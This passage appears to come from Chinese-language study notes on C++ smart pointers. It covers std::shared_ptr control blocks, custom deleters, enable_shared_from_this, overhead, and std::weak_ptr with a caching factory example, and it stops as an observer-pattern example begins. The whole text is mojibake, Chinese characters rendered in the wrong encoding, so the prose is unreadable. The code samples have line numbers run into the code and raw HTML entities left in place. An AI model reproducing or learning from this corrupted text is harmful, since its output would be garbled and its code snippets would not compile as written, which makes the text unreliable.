é™¤å™¨è§†ä½œç±»å‹çš„ä¸€éƒ¨åˆ†ã€‚ å¦ä¸€ä¸ªä¸åŒäºstd::unique_ptrçš„åœ°æ–¹æ˜¯ï¼ŒæŒ‡å®šè‡ªå®šä¹‰åˆ é™¤å™¨ä¸ä¼šæ”¹å˜std::shared_ptrå¯¹è±¡çš„å¤§å°ã€‚ä¸ç®¡åˆ é™¤å™¨æ˜¯ä»€ä¹ˆï¼Œä¸€ä¸ªstd::shared_ptrå¯¹è±¡éƒ½æ˜¯ä¸¤ä¸ªæŒ‡é’ˆå¤§å°ã€‚è¿™æ˜¯ä¸ªå¥½æ¶ˆæ¯ï¼Œä½†æ˜¯å®ƒåº”è¯¥è®©ä½ éšéšçº¦çº¦ä¸å®‰ã€‚è‡ªå®šä¹‰åˆ é™¤å™¨å¯ä»¥æ˜¯å‡½æ•°å¯¹è±¡ï¼Œå‡½æ•°å¯¹è±¡å¯ä»¥åŒ…å«ä»»æ„å¤šçš„æ•°æ®ã€‚å®ƒæ„å‘³ç€å‡½æ•°å¯¹è±¡æ˜¯ä»»æ„å¤§çš„ã€‚ å¼•ç”¨è®¡æ•°æ˜¯å¦ä¸€ä¸ªæ›´å¤§çš„æ•°æ®ç»“æ„çš„ä¸€éƒ¨åˆ†ï¼Œé‚£ä¸ªæ•°æ®ç»“æ„é€šå¸¸å«åšæ§åˆ¶å—ï¼ˆcontrol blockï¼‰ã€‚æ¯ä¸ªstd::shared_ptrç®¡ç†çš„å¯¹è±¡éƒ½æœ‰ä¸ªç›¸åº”çš„æ§åˆ¶å—ã€‚æ§åˆ¶å—é™¤äº†åŒ…å«å¼•ç”¨è®¡æ•°å€¼å¤–è¿˜æœ‰ä¸€ä¸ªè‡ªå®šä¹‰åˆ é™¤å™¨çš„æ‹·è´ï¼Œå½“ç„¶å‰ææ˜¯å­˜åœ¨è‡ªå®šä¹‰åˆ é™¤å™¨ã€‚å¦‚æœç”¨æˆ·è¿˜æŒ‡å®šäº†è‡ªå®šä¹‰åˆ†é…å™¨ï¼Œæ§åˆ¶å—ä¹Ÿä¼šåŒ…å«ä¸€ä¸ªåˆ†é…å™¨çš„æ‹·è´ã€‚æ§åˆ¶å—å¯èƒ½è¿˜åŒ…å«ä¸€äº›é¢å¤–çš„æ•°æ®ï¼Œä¸€ä¸ªæ¬¡çº§å¼•ç”¨è®¡æ•°weak countã€‚ å¯¹äºä¸€ä¸ªåˆ›å»ºæŒ‡å‘å¯¹è±¡çš„std::shared_ptrçš„å‡½æ•°æ¥è¯´ä¸å¯èƒ½çŸ¥é“æ˜¯å¦æœ‰å…¶ä»–std::shared_ptræ—©å·²æŒ‡å‘é‚£ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥æ§åˆ¶å—çš„åˆ›å»ºä¼šéµå¾ªä¸‹é¢å‡ æ¡è§„åˆ™ï¼š std::make_sharedæ€»æ˜¯åˆ›å»ºä¸€ä¸ªæ§åˆ¶å—ã€‚å®ƒåˆ›å»ºä¸€ä¸ªè¦æŒ‡å‘çš„æ–°å¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥è‚¯å®šstd::make_sharedè°ƒç”¨æ—¶å¯¹è±¡ä¸å­˜åœ¨å…¶ä»–æ§åˆ¶å—ã€‚ å½“ä»ç‹¬å æŒ‡é’ˆï¼ˆå³std::unique_ptræˆ–è€…std::auto_ptrï¼‰ä¸Šæ„é€ å‡ºstd::shared_ptræ—¶ä¼šåˆ›å»ºæ§åˆ¶å—ã€‚ç‹¬å æŒ‡é’ˆæ²¡æœ‰ä½¿ç”¨æ§åˆ¶å—ï¼Œæ‰€ä»¥æŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡æ²¡æœ‰å…³è”æ§åˆ¶å—ã€‚ï¼ˆä½œä¸ºæ„é€ çš„ä¸€éƒ¨åˆ†ï¼Œstd::shared_pträ¾µå ç‹¬å æŒ‡é’ˆæ‰€æŒ‡å‘çš„å¯¹è±¡çš„ç‹¬å æƒï¼Œæ‰€ä»¥ç‹¬å æŒ‡é’ˆè¢«è®¾ç½®ä¸ºnullï¼‰ å½“ä»åŸå§‹æŒ‡é’ˆä¸Šæ„é€ å‡ºstd::shared_ptræ—¶ä¼šåˆ›å»ºæ§åˆ¶å—ã€‚å¦‚æœä½ æƒ³ä»ä¸€ä¸ªæ—©å·²å­˜åœ¨æ§åˆ¶å—çš„å¯¹è±¡ä¸Šåˆ›å»ºstd::shared_ptrï¼Œä½ å°†å‡å®šä¼ é€’ä¸€ä¸ªstd::shared_ptræˆ–è€…std::weak_ptrã€‚ä½œä¸ºæ„é€ å‡½æ•°å®å‚ï¼Œè€Œä¸æ˜¯åŸå§‹æŒ‡é’ˆã€‚ç”¨std::shared_ptræˆ–è€…std::weak_pträ½œä¸ºæ„é€ å‡½æ•°å®å‚åˆ›å»ºstd::shared_pträ¸ä¼šåˆ›å»ºæ–°æ§åˆ¶å—ï¼Œå› ä¸ºå®ƒå¯ä»¥ä¾èµ–ä¼ é€’æ¥çš„æ™ºèƒ½æŒ‡é’ˆæŒ‡å‘æ§åˆ¶å—ã€‚ ä»åŸå§‹æŒ‡é’ˆä¸Šæ„é€ è¶…è¿‡ä¸€ä¸ªstd::shared_pträ¼šé€ æˆæœªå®šä¹‰è¡Œä¸ºï¼Œå› ä¸ºæŒ‡å‘çš„å¯¹è±¡æœ‰å¤šä¸ªæ§åˆ¶å—å…³è”ã€‚å¤šä¸ªæ§åˆ¶å—æ„å‘³ç€å¤šä¸ªå¼•ç”¨è®¡æ•°å€¼ï¼Œå¤šä¸ªå¼•ç”¨è®¡æ•°å€¼æ„å‘³ç€å¯¹è±¡å°†ä¼šè¢«é”€æ¯å¤šæ¬¡ï¼ˆæ¯ä¸ªå¼•ç”¨è®¡æ•°ä¸€æ¬¡ï¼‰ã€‚é‚£æ„å‘³ç€åƒä¸‹é¢çš„ä»£ç æ˜¯æœ‰é—®é¢˜çš„ï¼š 12345auto pw = new Widget; //pwæ˜¯åŸå§‹æŒ‡é’ˆâ€¦std::shared_ptr&lt;Widget&gt; spw1(pw, loggingDel); //ä¸º*pwåˆ›å»ºæ§åˆ¶å—â€¦std::shared_ptr&lt;Widget&gt; spw2(pw, loggingDel); //ä¸º*pwåˆ›å»ºç¬¬äºŒä¸ªæ§åˆ¶å— ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆè€Œä¸æ˜¯åŸå§‹æŒ‡é’ˆã€‚ ä½¿ç”¨ std::shared_ptr çš„å»ºè®®æ˜¯ï¼šç¬¬ä¸€ï¼Œé¿å…ä¼ ç»™std::shared_ptræ„é€ å‡½æ•°åŸå§‹æŒ‡é’ˆã€‚é€šå¸¸æ›¿ä»£æ–¹æ¡ˆæ˜¯ä½¿ç”¨std::make_sharedï¼Œä¸è¿‡ç”¨std::make_sharedå°±æ²¡åŠæ³•ä½¿ç”¨è‡ªå®šä¹‰åˆ é™¤å™¨ã€‚ç¬¬äºŒï¼Œå¦‚æœä½ å¿…é¡»ä¼ ç»™std::shared_ptræ„é€ å‡½æ•°åŸå§‹æŒ‡é’ˆï¼Œç›´æ¥ä¼ newå‡ºæ¥çš„ç»“æœï¼Œä¸è¦ä¼ æŒ‡é’ˆå˜é‡ã€‚ 12std::shared_ptr&lt;Widget&gt; spw1(new Widget, //ç›´æ¥ä½¿ç”¨newçš„ç»“æœ loggingDel); åˆ›å»ºspw2ä¹Ÿä¼šå¾ˆè‡ªç„¶çš„ç”¨spw1ä½œä¸ºåˆå§‹åŒ–å‚æ•°ï¼ˆå³ç”¨std::shared_ptræ‹·è´æ„é€ å‡½æ•°ï¼‰ï¼Œé‚£å°±æ²¡ä»€ä¹ˆé—®é¢˜äº†ï¼š 1std::shared_ptr&lt;Widget&gt; spw2(spw1); //spw2ä½¿ç”¨spw1ä¸€æ ·çš„æ§åˆ¶å— this æŒ‡é’ˆï¼šé¿å…åˆ›å»ºå¤šä½™çš„æ§åˆ¶å— std::enable_shared_from_thisã€‚å¦‚æœä½ æƒ³åˆ›å»ºä¸€ä¸ªç”¨std::shared_ptrç®¡ç†çš„ç±»ï¼Œè¿™ä¸ªç±»èƒ½å¤Ÿç”¨thisæŒ‡é’ˆå®‰å…¨åœ°åˆ›å»ºä¸€ä¸ªstd::shared_ptrï¼Œstd::enable_shared_from_thiså°±å¯ä½œä¸ºåŸºç±»çš„æ¨¡æ¿ç±»ã€‚Widgetå°†ä¼šç»§æ‰¿è‡ªstd::enable_shared_from_thisï¼š 123456class Widget: public std::enable_shared_from_this&lt;Widget&gt; &#123;public: â€¦ void process(); â€¦&#125;; è¿™ä¸ªæ ‡å‡†åå­—å°±æ˜¯å¥‡å¼‚é€’å½’æ¨¡æ¿æ¨¡å¼ï¼ˆThe Curiously Recurring Template Patternï¼ˆCRTPï¼‰ï¼‰ã€‚ std::enable_shared_from_this å®šä¹‰äº†ä¸€ä¸ªæˆå‘˜å‡½æ•°ï¼Œæˆå‘˜å‡½æ•°ä¼šåˆ›å»ºæŒ‡å‘å½“å‰å¯¹è±¡çš„std::shared_ptr å´ä¸åˆ›å»ºå¤šä½™æ§åˆ¶å—ã€‚è¿™ä¸ªæˆå‘˜å‡½æ•°å°±æ˜¯shared_from_thisï¼Œæ— è®ºåœ¨å“ªå½“ä½ æƒ³åœ¨æˆå‘˜å‡½æ•°ä¸­ä½¿ç”¨std::shared_ptræŒ‡å‘thisæ‰€æŒ‡å¯¹è±¡æ—¶éƒ½è¯·ä½¿ç”¨å®ƒã€‚è¿™é‡Œæœ‰ä¸ªWidget::processçš„å®‰å…¨å®ç°ï¼š 1234567void Widget::process()&#123; //å’Œä¹‹å‰ä¸€æ ·ï¼Œå¤„ç†Widget â€¦ //æŠŠæŒ‡å‘å½“å‰å¯¹è±¡çš„std::shared_ptråŠ å…¥processedWidgets processedWidgets.emplace_back(shared_from_this());&#125; ä»å†…éƒ¨æ¥è¯´ï¼Œshared_from_thisæŸ¥æ‰¾å½“å‰å¯¹è±¡æ§åˆ¶å—ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªæ–°çš„std::shared_ptrå…³è”è¿™ä¸ªæ§åˆ¶å—ã€‚è®¾è®¡çš„ä¾æ®æ˜¯å½“å‰å¯¹è±¡å·²ç»å­˜åœ¨ä¸€ä¸ªå…³è”çš„æ§åˆ¶å—ã€‚ è¦æƒ³ç¬¦åˆè®¾è®¡ä¾æ®çš„æƒ…å†µï¼Œå¿…é¡»å·²ç»å­˜åœ¨ä¸€ä¸ªæŒ‡å‘å½“å‰å¯¹è±¡çš„std::shared_ptrï¼ˆæ¯”å¦‚è°ƒç”¨shared_from_thisçš„æˆå‘˜å‡½æ•°å¤–é¢å·²ç»å­˜åœ¨ä¸€ä¸ªstd::shared_ptrï¼‰ã€‚å¦‚æœæ²¡æœ‰std::shared_ptræŒ‡å‘å½“å‰å¯¹è±¡ï¼ˆå³å½“å‰å¯¹è±¡æ²¡æœ‰å…³è”æ§åˆ¶å—ï¼‰ï¼Œè¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ï¼Œshared_from_thisé€šå¸¸æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚ è¦æƒ³é˜²æ­¢å®¢æˆ·ç«¯åœ¨å­˜åœ¨ä¸€ä¸ªæŒ‡å‘å¯¹è±¡çš„std::shared_ptrå‰å…ˆè°ƒç”¨å«æœ‰shared_from_thisçš„æˆå‘˜å‡½æ•°ï¼Œç»§æ‰¿è‡ªstd::enable_shared_from_thisçš„ç±»é€šå¸¸å°†å®ƒä»¬çš„æ„é€ å‡½æ•°å£°æ˜ä¸ºprivateï¼Œå¹¶ä¸”è®©å®¢æˆ·ç«¯é€šè¿‡è¿”å›std::shared_ptrçš„å·¥å‚å‡½æ•°åˆ›å»ºå¯¹è±¡ã€‚ä»¥Widgetä¸ºä¾‹ï¼Œä»£ç å¯ä»¥æ˜¯è¿™æ ·ï¼š 1234567891011class Widget: public std::enable_shared_from_this&lt;Widget&gt; &#123;public: //å®Œç¾è½¬å‘å‚æ•°ç»™privateæ„é€ å‡½æ•°çš„å·¥å‚å‡½æ•° template&lt;typename... Ts&gt; static std::shared_ptr&lt;Widget&gt; create(Ts&amp;&amp;... params); â€¦ void process(); //å’Œå‰é¢ä¸€æ · â€¦private: â€¦ //æ„é€ å‡½æ•°&#125;; ç¡®ä¿éœ€è¦å…ˆè°ƒç”¨ createï¼Œæ‰èƒ½è°ƒç”¨ processã€‚ shared_ptr å¼€é”€ æ§åˆ¶å—é€šå¸¸åªå å‡ ä¸ªwordå¤§å°ï¼Œè‡ªå®šä¹‰åˆ é™¤å™¨å’Œåˆ†é…å™¨å¯èƒ½ä¼šè®©å®ƒå˜å¤§ä¸€ç‚¹ã€‚é€šå¸¸æ§åˆ¶å—çš„å®ç°æ¯”ä½ æƒ³çš„æ›´å¤æ‚ä¸€äº›ã€‚å®ƒä½¿ç”¨ç»§æ‰¿ï¼Œç”šè‡³é‡Œé¢è¿˜æœ‰ä¸€ä¸ªè™šå‡½æ•°ï¼ˆç”¨æ¥ç¡®ä¿æŒ‡å‘çš„å¯¹è±¡è¢«æ­£ç¡®é”€æ¯ï¼‰ã€‚è¿™æ„å‘³ç€ä½¿ç”¨std::shared_ptr ï¼Œä¼šå¸¦æ¥ä½¿ç”¨è™šå‡½æ•°å¸¦æ¥çš„æˆæœ¬ã€‚ ä½¿ç”¨é»˜è®¤åˆ é™¤å™¨å’Œé»˜è®¤åˆ†é…å™¨ï¼Œä½¿ç”¨std::make_sharedåˆ›å»ºstd::shared_ptrï¼Œäº§ç”Ÿçš„æ§åˆ¶å—åªéœ€ä¸‰ä¸ªwordå¤§å°ã€‚å®ƒçš„åˆ†é…åŸºæœ¬ä¸Šæ˜¯æ— å¼€é”€çš„ã€‚ å¯¹std::shared_ptrè§£å¼•ç”¨çš„å¼€é”€ä¸ä¼šæ¯”åŸå§‹æŒ‡é’ˆé«˜ã€‚æ‰§è¡Œéœ€è¦åŸå­å¼•ç”¨è®¡æ•°ä¿®æ”¹çš„æ“ä½œéœ€è¦æ‰¿æ‹…ä¸€ä¸¤ä¸ªåŸå­æ“ä½œå¼€é”€ï¼Œè¿™äº›æ“ä½œé€šå¸¸éƒ½ä¼šä¸€ä¸€æ˜ å°„åˆ°æœºå™¨æŒ‡ä»¤ä¸Šï¼Œæ‰€ä»¥å³ä½¿å¯¹æ¯”éåŸå­æŒ‡ä»¤æ¥è¯´ï¼ŒåŸå­æŒ‡ä»¤å¼€é”€è¾ƒå¤§ï¼Œä½†æ˜¯å®ƒä»¬ä»ç„¶åªæ˜¯å•ä¸ªæŒ‡ä»¤ä¸Šçš„ã€‚å¯¹äºæ¯ä¸ªè¢«std::shared_ptræŒ‡å‘çš„å¯¹è±¡æ¥è¯´ï¼Œæ§åˆ¶å—ä¸­çš„è™šå‡½æ•°æœºåˆ¶äº§ç”Ÿçš„å¼€é”€é€šå¸¸åªéœ€è¦æ‰¿å—ä¸€æ¬¡ï¼Œå³å¯¹è±¡é”€æ¯çš„æ—¶å€™ã€‚ å¦‚æœç‹¬å èµ„æºå¯è¡Œæˆ–è€…å¯èƒ½å¯è¡Œï¼Œç”¨std::unique_ptræ˜¯ä¸€ä¸ªæ›´å¥½çš„é€‰æ‹©ã€‚å®ƒçš„æ€§èƒ½è¡¨ç°æ›´æ¥è¿‘äºåŸå§‹æŒ‡é’ˆï¼Œå¹¶ä¸”ä»std::unique_ptrå‡çº§åˆ°std::shared_pträ¹Ÿå¾ˆå®¹æ˜“ï¼Œå› ä¸ºstd::shared_ptrå¯ä»¥ä»std::unique_pträ¸Šåˆ›å»ºã€‚ ä» std::shared_ptrè½¬æ¢åˆ° std::unique_ptr æ˜¯ä¸è¡Œçš„ ã€‚å½“ä½ çš„èµ„æºç”±std::shared_ptrç®¡ç†ï¼Œç°åœ¨åˆæƒ³ä¿®æ”¹èµ„æºç”Ÿå‘½å‘¨æœŸç®¡ç†æ–¹å¼æ˜¯æ²¡æœ‰åŠæ³•çš„ã€‚å³ä½¿å¼•ç”¨è®¡æ•°ä¸ºä¸€ï¼Œä½ ä¹Ÿä¸èƒ½é‡æ–°ä¿®æ”¹èµ„æºæ‰€æœ‰æƒï¼Œæ”¹ç”¨std::unique_ptrç®¡ç†å®ƒã€‚èµ„æºå’ŒæŒ‡å‘å®ƒçš„std::shared_ptrçš„ç­¾è®¢çš„æ‰€æœ‰æƒåè®®æ˜¯â€œé™¤éæ­»äº¡å¦åˆ™æ°¸ä¸åˆ†å¼€â€ã€‚ä¸èƒ½åˆ†ç¦»ï¼Œä¸èƒ½åºŸé™¤ï¼Œæ²¡æœ‰ç‰¹è®¸ã€‚ std::shared_pträ¸èƒ½å¤„ç†çš„å¦ä¸€ä¸ªä¸œè¥¿æ˜¯æ•°ç»„ã€‚å’Œstd::unique_pträ¸åŒçš„æ˜¯ï¼Œstd::shared_ptrçš„APIè®¾è®¡ä¹‹åˆå°±æ˜¯é’ˆå¯¹å•ä¸ªå¯¹è±¡çš„ï¼Œæ²¡æœ‰åŠæ³•std::shared_ptr&lt;T[]&gt;ã€‚ std::shared_ptræ²¡æœ‰æä¾›operator[]ï¼Œæ‰€ä»¥æ•°ç»„ç´¢å¼•æ“ä½œéœ€è¦å€ŸåŠ©æ€ªå¼‚çš„æŒ‡é’ˆç®—æœ¯ã€‚å¦ä¸€æ–¹é¢ï¼Œstd::shared_ptræ”¯æŒè½¬æ¢ä¸ºæŒ‡å‘åŸºç±»çš„æŒ‡é’ˆï¼Œè¿™å¯¹äºå•ä¸ªå¯¹è±¡æ¥è¯´æœ‰æ•ˆï¼Œä½†æ˜¯å½“ç”¨äºæ•°ç»„ç±»å‹æ—¶è¿™æ˜¯å®¹æ˜“å‡ºé—®é¢˜ã€‚ï¼ˆå‡ºäºè¿™ä¸ªåŸå› ï¼Œstd::unique_ptr&lt;T[]&gt; APIç¦æ­¢è¿™ç§è½¬æ¢ã€‚ï¼‰ æ›´é‡è¦çš„æ˜¯ï¼ŒC++11å·²ç»æä¾›äº†å¾ˆå¤šå†…ç½®æ•°ç»„çš„å€™é€‰æ–¹æ¡ˆï¼ˆæ¯”å¦‚std::arrayï¼Œstd::vectorï¼Œstd::stringï¼‰ã€‚æ‰€ä»¥ï¼Œå£°æ˜ä¸€ä¸ªæŒ‡å‘æ•°ç»„çš„æ™ºèƒ½æŒ‡é’ˆå‡ ä¹æ€»æ˜¯ç³Ÿç³•çš„è®¾è®¡ã€‚ ç»“è®º std::shared_pträ¸ºæœ‰å…±äº«æ‰€æœ‰æƒçš„ä»»æ„èµ„æºæä¾›ä¸€ç§è‡ªåŠ¨åƒåœ¾å›æ”¶çš„ä¾¿æ·æ–¹å¼ã€‚ è¾ƒä¹‹äºstd::unique_ptrï¼Œstd::shared_ptrå¯¹è±¡é€šå¸¸å¤§ä¸¤å€ï¼Œæ§åˆ¶å—ä¼šäº§ç”Ÿå¼€é”€ï¼Œéœ€è¦åŸå­æ€§çš„å¼•ç”¨è®¡æ•°ä¿®æ”¹æ“ä½œã€‚ std::shared_ptr é»˜è®¤èµ„æºé”€æ¯æ˜¯é€šè¿‡deleteï¼Œä½†æ˜¯ä¹Ÿæ”¯æŒè‡ªå®šä¹‰åˆ é™¤å™¨ã€‚ä½†æ˜¯åˆ é™¤å™¨çš„ç±»å‹ä¸æ˜¯ std::shared_ptr çš„ç±»å‹çš„ä¸€éƒ¨åˆ†ã€‚ é¿å…ä»åŸå§‹æŒ‡é’ˆå˜é‡ä¸Šåˆ›å»ºstd::shared_ptrã€‚ 20 å½“std::shared_ptrå¯èƒ½æ‚¬ç©ºæ—¶ä½¿ç”¨std::weak_ptr ä¸€ä¸ªçœŸæ­£çš„æ™ºèƒ½æŒ‡é’ˆåº”è¯¥è·Ÿè¸ªæ‰€æŒ‡å¯¹è±¡ï¼Œåœ¨æ‚¬ç©ºæ—¶çŸ¥æ™“ï¼Œæ‚¬ç©ºï¼ˆdangleï¼‰å°±æ˜¯æŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡ä¸å†å­˜åœ¨ã€‚è¿™å°±æ˜¯å¯¹std::weak_ptræœ€ç²¾ç¡®çš„æè¿°ã€‚ std::weak_pträ¸èƒ½è§£å¼•ç”¨ï¼Œä¹Ÿä¸èƒ½æµ‹è¯•æ˜¯å¦ä¸ºç©ºå€¼ã€‚å› ä¸ºstd::weak_pträ¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ™ºèƒ½æŒ‡é’ˆã€‚å®ƒæ˜¯std::shared_ptrçš„å¢å¼ºã€‚ std::weak_ptré€šå¸¸ä»std::shared_pträ¸Šåˆ›å»ºã€‚å½“ä»std::shared_pträ¸Šåˆ›å»ºstd::weak_ptræ—¶ä¸¤è€…æŒ‡å‘ç›¸åŒçš„å¯¹è±¡ï¼Œä½†æ˜¯std::weak_pträ¸ä¼šå½±å“æ‰€æŒ‡å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ã€‚ 12345678auto spw = //spwåˆ›å»ºä¹‹åï¼ŒæŒ‡å‘çš„Widgetçš„ std::make_shared&lt;Widget&gt;(); //å¼•ç”¨è®¡æ•°ï¼ˆref countï¼ŒRCï¼‰ä¸º1ã€‚ â€¦std::weak_ptr&lt;Widget&gt; wpw(spw); //wpwæŒ‡å‘ä¸spwæ‰€æŒ‡ç›¸åŒçš„Widgetã€‚RCä»ä¸º1â€¦spw = nullptr; //RCå˜ä¸º0ï¼ŒWidgetè¢«é”€æ¯ã€‚ //wpwç°åœ¨æ‚¬ç©º æ‚¬ç©ºçš„std::weak_ptrè¢«ç§°ä½œå·²ç»expiredï¼ˆè¿‡æœŸï¼‰ã€‚ä½ å¯ä»¥ç”¨å®ƒç›´æ¥åšæµ‹è¯•ï¼š 1if (wpw.expired()) â€¦ //å¦‚æœwpwæ²¡æœ‰æŒ‡å‘å¯¹è±¡â€¦ ä½†æ˜¯é€šå¸¸ä½ æœŸæœ›çš„æ˜¯æ£€æŸ¥std::weak_ptræ˜¯å¦å·²ç»è¿‡æœŸï¼Œå¦‚æœæ²¡æœ‰è¿‡æœŸåˆ™è®¿é—®å…¶æŒ‡å‘çš„å¯¹è±¡ã€‚ä¸è¿‡ï¼Œå°†æ£€æŸ¥æ˜¯å¦è¿‡æœŸå’Œè§£å¼•ç”¨åˆ†å¼€ä¼šå¼•å…¥ç«æ€æ¡ä»¶ï¼šåœ¨è°ƒç”¨expiredå’Œè§£å¼•ç”¨æ“ä½œä¹‹é—´ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å¯èƒ½å¯¹æŒ‡å‘è¿™å¯¹è±¡çš„std::shared_ptré‡æ–°èµ‹å€¼æˆ–è€…ææ„ï¼Œå¹¶ç”±æ­¤é€ æˆå¯¹è±¡å·²ææ„ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œä½ çš„è§£å¼•ç”¨å°†ä¼šäº§ç”Ÿæœªå®šä¹‰è¡Œä¸ºã€‚ ä½ éœ€è¦çš„æ˜¯ä¸€ä¸ªåŸå­æ“ä½œæ£€æŸ¥std::weak_ptræ˜¯å¦å·²ç»è¿‡æœŸï¼Œå¦‚æœæ²¡æœ‰è¿‡æœŸå°±è®¿é—®æ‰€æŒ‡å¯¹è±¡ã€‚è¿™å¯ä»¥é€šè¿‡ä»std::weak_ptråˆ›å»ºstd::shared_ptræ¥å®ç°ï¼Œå…·ä½“æœ‰ä¸¤ç§å½¢å¼å¯ä»¥ä»std::weak_pträ¸Šåˆ›å»ºstd::shared_ptrï¼Œå…·ä½“ç”¨å“ªç§å–å†³äºstd::weak_ptrè¿‡æœŸæ—¶ä½ å¸Œæœ›std::shared_ptrè¡¨ç°å‡ºä»€ä¹ˆè¡Œä¸ºã€‚ ä¸€ç§å½¢å¼æ˜¯std::weak_ptr::lockï¼Œå®ƒè¿”å›ä¸€ä¸ªstd::shared_ptrï¼Œå¦‚æœstd::weak_ptrè¿‡æœŸè¿™ä¸ªstd::shared_pträ¸ºç©ºï¼š 123std::shared_ptr&lt;Widget&gt; spw1 = wpw.lock(); //å¦‚æœwpwè¿‡æœŸï¼Œspw1å°±ä¸ºç©º auto spw2 = wpw.lock(); //åŒä¸Šï¼Œä½†æ˜¯ä½¿ç”¨auto å¦ä¸€ç§å½¢å¼æ˜¯ä»¥std::weak_pträ¸ºå®å‚æ„é€ std::shared_ptrã€‚è¿™ç§æƒ…å†µä¸­ï¼Œå¦‚æœstd::weak_ptrè¿‡æœŸï¼Œä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼š 1std::shared_ptr&lt;Widget&gt; spw3(wpw); //å¦‚æœwpwè¿‡æœŸï¼ŒæŠ›å‡ºstd::bad_weak_ptrå¼‚å¸¸ ä¸€ä¸ªä¾‹å­ è€ƒè™‘ä¸€ä¸ªå·¥å‚å‡½æ•°ï¼Œå®ƒåŸºäºä¸€ä¸ªå”¯ä¸€IDä»åªè¯»å¯¹è±¡ä¸Šäº§å‡ºæ™ºèƒ½æŒ‡é’ˆã€‚æ ¹æ®æ¡æ¬¾18çš„æè¿°ï¼Œå·¥å‚å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªè¯¥å¯¹è±¡ç±»å‹çš„std::unique_ptrï¼š 1std::unique_ptr&lt;const Widget&gt; loadWidget(WidgetID id); å¦‚æœè°ƒç”¨loadWidgetæ˜¯ä¸€ä¸ªæ˜‚è´µçš„æ“ä½œï¼ˆæ¯”å¦‚å®ƒæ“ä½œæ–‡ä»¶æˆ–è€…æ•°æ®åº“I/Oï¼‰å¹¶ä¸”é‡å¤ä½¿ç”¨IDå¾ˆå¸¸è§ï¼Œä¸€ä¸ªåˆç†çš„ä¼˜åŒ–æ˜¯å†å†™ä¸€ä¸ªå‡½æ•°é™¤äº†å®ŒæˆloadWidgetåšçš„äº‹æƒ…ä¹‹å¤–å†ç¼“å­˜å®ƒçš„ç»“æœã€‚å¦ä¸€ä¸ªåˆç†çš„ä¼˜åŒ–å¯ä»¥æ˜¯å½“Widgetä¸å†ä½¿ç”¨çš„æ—¶å€™é”€æ¯å®ƒçš„ç¼“å­˜ã€‚ å¯¹äºå¯ç¼“å­˜çš„å·¥å‚å‡½æ•°ï¼Œè¿”å›std::unique_pträ¸æ˜¯å¥½çš„é€‰æ‹©ã€‚è°ƒç”¨è€…åº”è¯¥æ¥æ”¶ç¼“å­˜å¯¹è±¡çš„æ™ºèƒ½æŒ‡é’ˆï¼Œè°ƒç”¨è€…ä¹Ÿåº”è¯¥ç¡®å®šè¿™äº›å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸï¼Œä½†æ˜¯ç¼“å­˜æœ¬èº«ä¹Ÿéœ€è¦ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å®ƒæ‰€ç¼“å­˜çš„å¯¹è±¡ã€‚ç¼“å­˜å¯¹è±¡çš„æŒ‡é’ˆéœ€è¦çŸ¥é“å®ƒæ˜¯å¦å·²ç»æ‚¬ç©ºï¼Œå› ä¸ºå½“å·¥å‚å®¢æˆ·ç«¯ä½¿ç”¨å®Œå·¥å‚äº§ç”Ÿçš„å¯¹è±¡åï¼Œå¯¹è±¡å°†è¢«é”€æ¯ï¼Œå…³è”çš„ç¼“å­˜æ¡ç›®ä¼šæ‚¬ç©ºã€‚æ‰€ä»¥ç¼“å­˜åº”è¯¥ä½¿ç”¨std::weak_ptrï¼Œè¿™å¯ä»¥çŸ¥é“æ˜¯å¦å·²ç»æ‚¬ç©ºã€‚è¿™æ„å‘³ç€å·¥å‚å‡½æ•°è¿”å›å€¼ç±»å‹åº”è¯¥æ˜¯std::shared_ptrï¼Œå› ä¸ºåªæœ‰å½“å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸç”±std::shared_ptrç®¡ç†æ—¶ï¼Œstd::weak_ptræ‰èƒ½æ£€æµ‹åˆ°æ‚¬ç©ºã€‚ ä¸€ä¸ªç®€ç‰ˆçš„å®ç°ï¼š 123456789101112131415std::shared_ptr&lt;const Widget&gt; fastLoadWidget(WidgetID id)&#123; static std::unordered_map&lt;WidgetID, std::weak_ptr&lt;const Widget&gt;&gt; cache; //std::weak_ptr&lt;const Widget&gt; auto objPtr = cache[id].lock(); //objPtræ˜¯å»ç¼“å­˜å¯¹è±¡çš„ //std::shared_ptrï¼ˆæˆ– //å½“å¯¹è±¡ä¸åœ¨ç¼“å­˜ä¸­æ—¶ä¸ºnullï¼‰ if (!objPtr) &#123; //å¦‚æœä¸åœ¨ç¼“å­˜ä¸­ objPtr = loadWidget(id); //åŠ è½½å®ƒ cache[id] = objPtr; //ç¼“å­˜å®ƒ &#125; return objPtr;&#125; fastLoadWidgetçš„å®ç°ä»æœ‰ä»¥ä¸‹é—®é¢˜ï¼šç¼“å­˜å¯èƒ½ä¼šç´¯ç§¯è¿‡æœŸçš„std::weak_ptrï¼Œè¿™äº›æŒ‡é’ˆå¯¹åº”äº†ä¸å†ä½¿ç”¨çš„Widgetï¼ˆä¹Ÿå·²ç»è¢«é”€æ¯äº†ï¼‰ã€‚ å¦ä¸€ä¸ªä¾‹å­ è€ƒè™‘ç¬¬äºŒä¸ªç”¨ä¾‹ï¼šè§‚å¯Ÿè€…è®¾è®¡æ¨¡å¼ï¼ˆObserver design patternï¼‰ã€‚ 